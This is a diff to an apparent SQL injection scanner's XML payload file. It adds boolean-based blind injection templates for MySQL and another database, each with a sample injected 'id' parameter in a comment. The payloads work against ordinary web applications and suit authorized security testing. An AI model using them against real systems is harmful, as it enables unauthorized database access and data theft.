@@ -21,6 +21,8 @@
         <dbms value="MySQL">
             <!--    e,g    id=1' RLIKE (SELECT (CASE WHEN (4058=6681) THEN 1 ELSE 0x28 END)) AND 'Jore'='Jore  -->
             <payload value="RLIKE (SELECT (CASE WHEN ($R1=$R2) THEN 1 ELSE 0x28 END))$HZ"/>
+            <!--    e,g    id=1' RLIKE (SELECT (CASE WHEN (4058=6681) THEN 1 ELSE 0x28 END))减减 Asdf  -->
+            <payload value="RLIKE (SELECT (CASE WHEN ($R1=$R2) THEN 1 ELSE 0x28 END))-- $S"/>
         </dbms>
         <dbms value="SQLServer">
             <!--    e,g    id=1',(SELECT (CASE WHEN (4086=1166) THEN 1 ELSE 4086*(SELECT 4086 UNION ALL SELECT 1166) END))减减 QiIo  -->
@@ -49,6 +51,8 @@
             <payload value="AND$QFH$RR$HFHLIKE$QFH_$XHX%"/>
             <!--    e,g    id=1'%26%26'2103'LIKE'4262  -->
             <payload value="%26%26$QFH$R1$HFHLIKE$QFH$R2"/>
+            <!-- (SELECT (CASE WHEN (1472=1471) THEN 1472 ELSE (SELECT 4371 UNION SELECT 6804) END)) -->
+            <payload value="(SELECT (CASE WHEN ($R1=$R2) THEN $R1 ELSE (SELECT $R2 UNION SELECT $R3) END))"/>
         </dbms>
     </type>
 
